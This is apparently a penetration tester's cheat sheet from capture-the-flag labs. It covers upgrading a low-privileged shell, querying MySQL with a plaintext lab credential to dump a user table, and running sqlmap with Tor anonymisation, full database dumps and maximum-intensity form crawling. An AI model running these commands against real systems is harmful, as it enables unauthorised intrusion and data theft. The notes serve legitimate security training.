When trying to gain access to SQL whilst having a low privileged shell, make sure to first upgrade the TTY with python if possible, this way error handling works a lot better.
`python3 -c 'import pty;pty.spawn("/bin/bash")'`

### SQL from CLI ###
Start SQL session with username and password
`mysql -u username -p`
Start SQL session with username and password and specified host
`mysql -u username -p -h 127.0.0.1 -D databasename`

`.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show databases;"`
`.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "SHOW TABLES;" gibbon`
`.\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "USE gibbon; SELECT * FROM gibbonperson;" -E`
### SQLMap ####
Default scanning option
`sqlmap -u http://domain.com/login.php / forget_password.php `
Scanning using TOR
`sqlmap -u "http://testsite.com/login.php" --tor --tor-type=SOCKS5`
Dump all from the database:
`sqlmap -u "http://testsite.com/login.php" -a`
Do everything at all the highest levels with most network traffic:
`sqlmap -u http://monitorsthree.htb/forgot_password.php --forms --crawl=2 -a --risk=3 --level=5`
